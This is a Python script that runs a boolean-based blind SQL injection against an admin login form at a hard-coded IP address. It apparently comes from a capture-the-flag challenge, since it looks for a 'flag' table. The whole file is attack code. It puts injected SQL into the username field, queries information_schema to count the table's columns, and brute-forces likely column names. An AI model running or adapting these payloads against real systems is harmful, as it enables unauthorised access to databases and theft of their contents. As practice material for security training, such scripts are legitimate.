import urllib.request, urllib.parse

url = 'http://160.202.254.160:19353/admin/login'

def test(payload):
    data = urllib.parse.urlencode({'username': payload, 'password': '123456'}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return 'Redirecting' in resp.read().decode()
    except:
        return None  # error = SQL failed

# Test: does the flag table have a column called 'flag'?
# Use information_schema to find column names

# First, let's test if information_schema is accessible
r = test("test' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag')>0 AND '1'='1")
print(f'information_schema accessible: {r}')

# Try to determine number of columns in flag table
for i in range(1, 10):
    r = test("test' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_NAME='flag')=" + str(i) + " AND '1'='1")
    if r:
        print(f'flag table has {i} columns')
        break

# Try common column names directly
cols = ['flag', 'value', 'text', 'content', 'secret', 'data', 'answer', 'f', 'id', 'name']
for col in cols:
    # Test if this column exists by trying to select it
    r = test("test' AND (SELECT " + col + " FROM flag LIMIT 1) IS NOT NULL AND '1'='1")
    if r is True:
        print(f'Column "{col}" EXISTS and has non-null data')
    elif r is False:
        print(f'Column "{col}" EXISTS but data is null (or condition false)')
    else:
        print(f'Column "{col}" ERROR (probably does not exist)')
